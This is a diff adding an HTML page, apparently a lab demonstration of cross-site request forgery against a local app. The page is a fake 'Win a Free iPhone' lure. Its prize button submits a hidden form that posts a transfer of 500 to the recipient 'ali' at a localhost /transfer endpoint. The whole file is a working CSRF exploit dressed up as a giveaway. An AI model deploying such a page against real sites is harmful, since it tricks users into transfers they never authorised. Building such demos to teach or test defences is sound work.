@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html id="attack">
+<head>
+    <title>Win a Free iPhone!</title>
+</head>
+<body>
+    <h1>Congratulations! You won a free iPhone!</h1>
+    <p>Click the button below to claim your prize!</p>
+
+    <!-- Hidden CSRF attack form -->
+    <form action="http://localhost:5000/transfer" method="POST"  id="attacker-form">
+
+        <input type="hidden" name="recipient" value="ali">
+        <input type="hidden" name="amount" value="500">
+    </form>
+
+    <button onclick="document.getElementById('attacker-form').submit()">
+        Claim Your Prize Now!
+    </button>
+
+    <p><small>By clicking this button, you agree to our terms and conditions.</small></p>
+</body>
+</html>
